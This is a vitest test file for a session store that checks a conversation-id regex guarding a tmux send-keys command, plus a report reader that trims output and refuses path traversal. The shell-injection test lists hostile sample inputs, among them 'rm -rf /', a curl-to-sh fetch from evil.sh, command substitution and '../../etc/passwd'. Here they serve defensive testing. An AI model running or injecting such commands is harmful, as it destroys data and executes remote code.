import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { beforeAll, describe, expect, it } from "vitest";

let CONV_ID_RE: RegExp;
let readReport: (id: string) => Promise<string | null>;
let sessionsDir: string;

beforeAll(async () => {
  // env.ts snapshots process.env at first import (see projects.test.ts).
  process.env.REPOS_DIR = fs.mkdtempSync(path.join(os.tmpdir(), "vk-repos-"));
  sessionsDir = fs.mkdtempSync(path.join(os.tmpdir(), "vk-sess-"));
  process.env.SESSIONS_DIR = sessionsDir;
  process.env.STATIC_DIR = "";
  ({ CONV_ID_RE, readReport } = await import("../src/sessions-store.js"));
});

// The id read out of the .conv file goes into the resume command, and that
// command is delivered with `tmux send-keys` — typed into the pane's shell.
// Nothing downstream escapes it, so this pattern is the whole defense.
describe("CONV_ID_RE", () => {
  it("accepts the uuid claude writes", () => {
    expect(CONV_ID_RE.test("4b953f35-5791-4984-93a4-cfea987d28ad")).toBe(true);
  });

  it("rejects shell metacharacters", () => {
    for (const evil of [
      "abc; rm -rf /",
      "abc && curl evil.sh | sh",
      "abc$(id)",
      "abc`id`",
      "abc | tee /etc/passwd",
      "abc\nrm -rf /",
      "abc > /data/settings.json",
      "abc'; echo pwned; '",
      "../../etc/passwd",
      "abc def",
    ]) {
      expect(CONV_ID_RE.test(evil), evil).toBe(false);
    }
  });

  it("rejects empty and absurd lengths", () => {
    expect(CONV_ID_RE.test("")).toBe(false);
    expect(CONV_ID_RE.test("short")).toBe(false);
    expect(CONV_ID_RE.test("a".repeat(65))).toBe(false);
  });
});

// The verdict an unattended run writes about itself. It reaches a push
// notification verbatim, so it is trimmed to one line and a sane length.
describe("readReport", () => {
  const write = (id: string, text: string) =>
    fs.writeFileSync(path.join(sessionsDir, `${id}.report`), text);

  it("reads the first line and nothing after it", async () => {
    write("vk-demo-1", "  ok: nothing to merge  \nand a second line the phone never sees\n");
    expect(await readReport("vk-demo-1")).toBe("ok: nothing to merge");
  });

  it("caps a run that wrote an essay on one line", async () => {
    write("vk-demo-2", "attention: " + "x".repeat(500));
    expect((await readReport("vk-demo-2"))!.length).toBe(300);
  });

  it("is null for no file, an empty one, and any id that isn't a session", async () => {
    write("vk-demo-3", "   \n  \n");
    expect(await readReport("vk-demo-3")).toBeNull();
    expect(await readReport("vk-demo-4")).toBeNull();
    expect(await readReport("../../etc/passwd")).toBeNull();
  });
});
